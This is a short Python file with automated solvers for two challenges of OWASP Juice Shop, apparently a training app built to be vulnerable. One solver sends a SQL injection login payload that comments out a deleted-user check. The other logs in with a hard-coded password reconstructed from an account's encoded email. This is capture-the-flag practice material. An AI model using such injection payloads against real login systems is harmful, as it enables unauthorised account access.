from core.base_solver import BaseSolver
from loguru import logger
import time

class GhostLoginSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "ghostLoginChallenge"

    def solve(self) -> bool:
        # Chris Pike is deleted (deletedAt is not NULL)
        # We need to bypass the 'AND deletedAt IS NULL' check in login query
        payload = {
            "email": "chris.pike@juice-sh.op'--",
            "password": "anything"
        }
        res = self.client.post("/rest/user/login", json=payload)
        return res.status_code == 200

class OAuthUserPasswordSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "oauthUserPasswordChallenge"

    def solve(self) -> bool:
        # Bjoern's OAuth credentials (from login.ts)
        payload = {
            "email": "bjoern.kimminich@gmail.com",
            "password": "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="
        }
        res = self.client.post("/rest/user/login", json=payload)
        return res.status_code == 200


